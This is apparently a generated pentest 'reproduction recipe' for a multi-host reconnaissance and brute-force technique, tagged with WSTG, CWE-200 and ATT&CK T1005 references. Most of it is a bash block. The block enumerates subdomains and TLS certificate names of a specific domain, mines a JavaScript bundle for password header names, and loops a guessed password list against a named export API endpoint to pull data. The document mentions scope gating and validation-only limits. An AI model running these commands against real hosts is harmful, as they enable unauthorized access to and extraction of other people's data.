# Reproduction Recipe

- source canon: `holyshit-mode/recon-technique-multi-host-brute.md`
- bindings: **WSTG-BUSL** · **CWE-200** · **ATT&CK T1005**
- generated: 2026-11-04

## Route

- probes: `nmap-slowloris-check`, `curl`
- chains: `web`
- gate: every probe runs through the shared scope authority (rc=1 out of estate); the 3-gate differential turns output into a finding

## The technique

```bash
# 1. Discover hosts (DNS + TLS SAN)
echo -e "api\ndoc\ninternal\nstatus\nstaging" | while read s; do host $s.freeinference.org; done
openssl s_client -connect freeinference.org:443 -servername freeinference.org < /dev/null 2>/dev/null | openssl x509 -noout -text | grep -A1 "Subject Alternative Name"

# 2. Mine JS bundle for password headers
curl -s https://doc.freeinference.org | grep -oP 'x-[a-z]+-password'

# 3. Brute-force (no rate limit → full speed)
for p in admin password freeinference openinfra madsys harvard seal; do
  curl -s -H "x-export-password: $p" "https://openinfra.freeinference.org/api/export?days=30" | head -c 100
done
```

## Family use

- decisive-test shape lives in the source canon
- walls: validation-only · NO-GAIN · documented-class adaptation only
